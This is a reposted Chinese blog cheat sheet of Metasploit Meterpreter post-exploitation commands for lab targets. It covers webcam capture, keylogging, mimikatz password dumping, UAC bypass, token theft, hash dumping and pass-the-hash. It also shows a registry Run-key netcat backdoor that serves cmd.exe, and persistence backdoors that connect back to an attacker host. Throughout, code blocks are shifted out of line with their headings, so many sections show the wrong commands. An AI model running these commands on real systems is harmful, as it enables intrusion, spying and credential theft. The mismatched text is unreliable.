> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [blog.csdn.net](https://blog.csdn.net/qq_38228830/article/details/85927942)

本文转载来源：[https://xz.aliyun.com/t/2536](https://xz.aliyun.com/t/2536)

Metasploit 中的 Meterpreter 模块在后渗透阶段具有强大的攻击力，本文主要整理了 meterpreter 的常用命令、脚本及使用方式。包含信息收集、提权、注册表操作、令牌操纵、哈希利用、后门植入等。

### 0x01. 系统命令

1）基本系统命令

```
sessions    #sessions –h 查看帮助
sessions -i <ID值>  #进入会话   -k  杀死会话
background  #将当前会话放置后台
run  #执行已有的模块，输入run后按两下tab，列出已有的脚本
info #查看已有模块信息
getuid # 查看权限 
getpid # 获取当前进程的pid
sysinfo # 查看目标机系统信息
ps # 查看当前活跃进程    kill <PID值> 杀死进程
idletime #查看目标机闲置时间
reboot / shutdown   #重启/关机
shell #进入目标机cmd shell
```

2）uictl 开关键盘 / 鼠标

```
uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标
uictl disable mouse  #禁用鼠标
uictl disable keyboard  #禁用键盘
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8d78731c-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8d78731c-998c-1.png)

3）webcam 摄像头命令

```
webcam_list  #查看摄像头
webcam_snap   #通过摄像头拍照
webcam_stream   #通过摄像头开启视频
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8d93ac72-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8d93ac72-998c-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8da675dc-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8da675dc-998c-1.png)

4）execute 执行文件

```
execute #在目标机中执行文件
execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8db2c63e-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8db2c63e-998c-1.png)

5）migrate 进程迁移

```
getpid    # 获取当前进程的pid
ps   # 查看当前活跃进程
migrate <pid值>    #将Meterpreter会话移植到指定pid值进程中
kill <pid值>   #杀死进程
```

6）clearav 清除日志

```
getwd 或者pwd # 查看当前工作目录  
ls
cd
search -f *pass*       # 搜索文件  -h查看帮助
cat c:\\lltest\\lltestpasswd.txt  # 查看文件内容
upload /tmp/hack.txt C:\\lltest  # 上传文件到目标机上
download c:\\lltest\\lltestpasswd.txt /tmp/ # 下载文件到本机上
edit c:\\1.txt #编辑或创建文件  没有的话，会新建文件
rm C:\\lltest\\hack.txt
mkdir lltest2  #只能在当前目录下创建文件夹
rmdir lltest2  #只能删除当前目录下文件夹
getlwd   或者 lpwd   #操作攻击者主机 查看当前目录
lcd /tmp   #操作攻击者主机 切换目录
```

### 0x02. 文件系统命令

1）基本文件系统命令

```
timestomp C:// -h   #查看帮助
timestomp -v C://2.txt   #查看时间戳
timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt
```

2）timestomp 伪造时间戳

```
ipconfig/ifconfig
netstat –ano
arp
getproxy   #查看代理信息
route   #查看路由
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8dc36548-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8dc36548-998c-1.png)

### 0x03. 网络命令

1）基本网络命令

```
run autoroute –h #查看帮助
run autoroute -s 192.168.159.0/24  #添加到目标环境网络
run autoroute –p  #查看添加的路由
```

2）portfwd 端口转发

```
run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24
run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=3389
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8dd84710-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8dd84710-998c-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8df589f6-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8df589f6-998c-1.png)

3）autoroute 添加路由

```
msf> use auxiliary/server/socks4a 
msf > set srvhost 127.0.0.1
msf > set srvport 1080
msf > run
```

然后可以利用 arp_scanner、portscan 等进行扫描

```
/usr/share/metasploit-framework/modules/post/windows/gather
/usr/share/metasploit-framework/modules/post/linux/gather
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e0bdbca-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e0bdbca-998c-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e1d7ec0-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e1d7ec0-998c-1.png)

4）Socks4a 代理

autoroute 添加完路由后，还可以利用 msf 自带的 sock4a 模块进行 Socks4a 代理

```
run post/windows/gather/checkvm #是否虚拟机
run post/linux/gather/checkvm #是否虚拟机
run post/windows/gather/forensics/enum_drives #查看分区
run post/windows/gather/enum_applications #获取安装软件信息
run post/windows/gather/dumplinks   #获取最近的文件操作
run post/windows/gather/enum_ie  #获取IE缓存
run post/windows/gather/enum_chrome   #获取Chrome缓存
run post/windows/gather/enum_patches  #补丁信息
run post/windows/gather/enum_domain  #查找域控
```

然后 vi /etc/proxychains.conf #添加 socks4 127.0.0.1 1080  
最后 proxychains 使用 Socks4a 代理访问

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e2ebffa-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e2ebffa-998c-1.png)

### 0x04. 信息收集

信息收集的脚本位于：

```
use exploit/windows/local/bypassuac
use exploit/windows/local/bypassuac_injection
use windows/local/bypassuac_vbs
use windows/local/ask
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e454716-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e454716-998c-1.png)

信息收集的脚本较多，仅列几个常用的：

```
msf > use exploit/windows/local/bypassuac
msf > set SESSION 2
msf > run
```

### 0x05. 提权

1)getsystem 提权

```
meterpreter > run post/windows/gather/enum_patches  #查看补丁信息
msf > use exploit/windows/local/ms13_053_schlamperei
msf > set SESSION 2
msf > exploit
```

getsystem 工作原理：  
①getsystem 创建一个新的 Windows 服务，设置为 SYSTEM 运行，当它启动时连接到一个命名管道。  
②getsystem 产生一个进程，它创建一个命名管道并等待来自该服务的连接。  
③Windows 服务已启动，导致与命名管道建立连接。  
④该进程接收连接并调用 ImpersonateNamedPipeClient，从而为 SYSTEM 用户创建模拟令牌。  
然后用新收集的 SYSTEM 模拟令牌产生 cmd.exe，并且我们有一个 SYSTEM 特权进程。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e5f42e2-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e5f42e2-998c-1.png)

2)bypassuac

内置多个 pypassuac 脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行 getsystem 获取系统权限，如：

```
load mimikatz    #help mimikatz 查看帮助
wdigest  #获取Wdigest密码
mimikatz_command -f samdump::hashes  #执行mimikatz原始命令
mimikatz_command -f sekurlsa::searchPasswords
```

如使用 bypassuac.rb 脚本：

```
enumdesktops  #查看可用的桌面
getdesktop    #获取当前meterpreter 关联的桌面
set_desktop   #设置meterpreter关联的桌面  -h查看帮助
screenshot  #截屏
use espia  #或者使用espia模块截屏  然后输入screengrab
run vnc  #使用vnc远程桌面连接
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e75a848-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e75a848-998c-1.png)

3) 内核漏洞提权

可先利用 enum_patches 模块 收集补丁信息，然后查找可用的 exploits 进行提权

```
run getgui –h #查看帮助
run getgui -e #开启远程桌面
run getgui -u lltest2 -p 123456   #添加用户
run getgui -f 6661 –e   #3389端口转发到6661
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8e85924e-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8e85924e-998c-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8e9b89e6-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8e9b89e6-998c-1.png)

### 0x06.mimikatz 抓取密码

```
run post/windows/manage/enable_rdp  #开启远程桌面
run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户
run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8eac2e2c-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8eac2e2c-998c-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8ebb6bc6-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8ebb6bc6-998c-1.png)

### 0x07. 远程桌面 & 截屏

```
keyscan_start  #开始键盘记录
keyscan_dump   #导出记录数据
keyscan_stop #结束键盘记录
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8ee6331a-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8ee6331a-998c-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f1a70c6-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f1a70c6-998c-1.png)

### 0x08. 开启 rdp & 添加用户

1)getgui 命令

```
use sniffer
sniffer_interfaces   #查看网卡
sniffer_start 2   #选择网卡 开始抓包
sniffer_stats 2   #查看状态
sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包
sniffer_stop 2   #停止抓包
```

getgui 系统不推荐，推荐使用 run post/windows/manage/enable_rdp  
getgui 添加用户时，有时虽然可以成功添加用户，但是没有权限通过远程桌面登陆  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f3485ce-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f3485ce-998c-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f42c288-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f42c288-998c-1.png)

2)enable_rdp 脚本

```
reg –h
    -d   注册表中值的数据.    -k   注册表键路径    -v   注册表键名称
    enumkey 枚举可获得的键    setval 设置键值    queryval 查询键值数据
```

脚本位于 / usr/share/metasploit-framework/modules/post/windows/manage/enable_rdp.rb  
通过 enable_rdp.rb 脚本可知：开启 rdp 是通过 reg 修改注册表；添加用户是调用 cmd.exe 通过 net user 添加；端口转发是利用的 portfwd 命令  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f547726-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f547726-998c-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f692b80-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f692b80-998c-1.png)

### 0x09. 键盘记录

```
upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc
reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d 'C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe' #设置键值
reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值
 
nc -v 192.168.159.144 443  #攻击者连接nc后门
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f75ddc6-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f75ddc6-998c-1.png)

### 0x10.sniffer 抓包

```
use incognito      #help incognito  查看帮助
list_tokens -u    #查看可用的token
impersonate_token 'NT AUTHORITY\SYSTEM'  #假冒SYSTEM token
或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\
execute -f cmd.exe -i –t    # -t 使用假冒的token 执行
或者直接shell
rev2self   #返回原始token
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f86f804-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f86f804-998c-1.png)

### 0x11. 注册表操作

1) 注册表基本命令

```
steal_token <pid值>   #从指定进程中窃取token   先ps
drop_token  #删除窃取的token
```

2) 注册表设置 nc 后门

```
run post/windows/gather/smart_hashdump  #从SAM导出密码哈希
#需要SYSTEM权限
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f98f61c-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f98f61c-998c-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8fbd4d32-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8fbd4d32-998c-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8fcc6452-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8fcc6452-998c-1.png)

### 0x12. 令牌操纵

1)incognito 假冒令牌

```
msf > use exploit/windows/smb/psexec
msf > set payload windows/meterpreter/reverse_tcp
msf > set LHOST 192.168.159.134
msf > set LPORT 443
msf > set RHOST 192.168.159.144
msf >set SMBUser Administrator
msf >set SMBPass aad3b4*****04ee:5b5f00*****c424c
msf >set SMBDomain  WORKGROUP   #域用户需要设置SMBDomain
msf >exploit
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8fdf8654-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8fdf8654-998c-1.png)

2)steal_token 窃取令牌

```
run persistence –h  #查看帮助
run persistence -X -i 5 -p 6661 -r 192.168.159.134
#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8fee2862-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8fee2862-998c-1.png)

### 0x13. 哈希利用

1) 获取哈希

```
msf > use exploit/multi/handler
msf > set payload windows/meterpreter/reverse_tcp
msf > set LHOST 192.168.159.134
msf > set LPORT 6661
msf > exploit
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8ffec58c-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8ffec58c-998c-1.png)

2)PSExec 哈希传递

通过 smart_hashdump 获取用户哈希后，可以利用 psexec 模块进行哈希传递攻击  
前提条件：①开启 445 端口 smb 服务；②开启 admin$ 共享

```
run metsvc –h   # 查看帮助
run metsvc –A   #自动安装后门
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-900da246-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-900da246-998c-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-901e3d36-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-901e3d36-998c-1.png)

### 0x14. 后门植入

metasploit 自带的后门有两种方式启动的，一种是通过启动项启动 (persistence)，一种是通过服务启动 (metsvc)，另外还可以通过 persistence_exe 自定义后门文件。

1)persistence 启动项后门

在 C:\Users***\AppData\Local\Temp \ 目录下，上传一个 vbs 脚本  
在注册表 HKLM\Software\Microsoft\Windows\CurrentVersion\Run \ 加入开机启动项

```
msf > use exploit/multi/handler
msf > set payload windows/metsvc_bind_tcp
msf > set RHOST 192.168.159.144
msf > set LPORT 31337
msf > exploit
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-902cd47c-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-902cd47c-998c-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-9041d688-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-9041d688-998c-1.png)

**连接后门**

```
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/jboss_vulnscan
use auxiliary/scanner/mssql/mssql_login
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/oracle/oracle_login
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232243-9051352e-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232243-9051352e-998c-1.png)

2)metsvc 服务后门

在 C:\Users***\AppData\Local\Temp \ 上传了三个文件（metsrv.x86.dll、metsvc-server.exe、metsvc.exe），通过服务启动，服务名为 meterpreter

```
run metsvc –h   # 查看帮助
run metsvc –A   #自动安装后门
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232243-9060162a-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232243-9060162a-998c-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232243-9077bb4a-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232243-9077bb4a-998c-1.png)

**连接后门**

```
msf > use exploit/multi/handler
msf > set payload windows/metsvc_bind_tcp
msf > set RHOST 192.168.159.144
msf > set LPORT 31337
msf > exploit
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180806232243-90b333b4-998c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180806232243-90b333b4-998c-1.png)

### 0x15. 扫描脚本

扫描的脚本位于：  
/usr/share/metasploit-framework/modules/auxiliary/scanner/  
扫描的脚本较多，仅列几个代表：

```
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/jboss_vulnscan
use auxiliary/scanner/mssql/mssql_login
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/oracle/oracle_login
```

**参考:**  
[https://null-byte.wonderhowto.com/how-to/hack-like-pro-ultimate-command-cheat-sheet-for-metasploits-meterpreter-0149146/](https://null-byte.wonderhowto.com/how-to/hack-like-pro-ultimate-command-cheat-sheet-for-metasploits-meterpreter-0149146/)  
[https://thehacktoday.com/metasploit-commands/](https://thehacktoday.com/metasploit-commands/)  
[https://www.offensive-security.com/metasploit-unleashed/fun-incognito/](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/)  
[https://www.offensive-security.com/metasploit-unleashed/persistent-netcat-backdoor/](https://www.offensive-security.com/metasploit-unleashed/persistent-netcat-backdoor/)  
[https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/](https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/)  
[http://www.hackingarticles.in/7-ways-to-privilege-escalation-of-windows-7-pc-bypass-uac/](http://www.hackingarticles.in/7-ways-to-privilege-escalation-of-windows-7-pc-bypass-uac/)  
[https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)  
[http://wooyun.jozxing.cc/static/drops/tips-2227.html](http://wooyun.jozxing.cc/static/drops/tips-2227.html)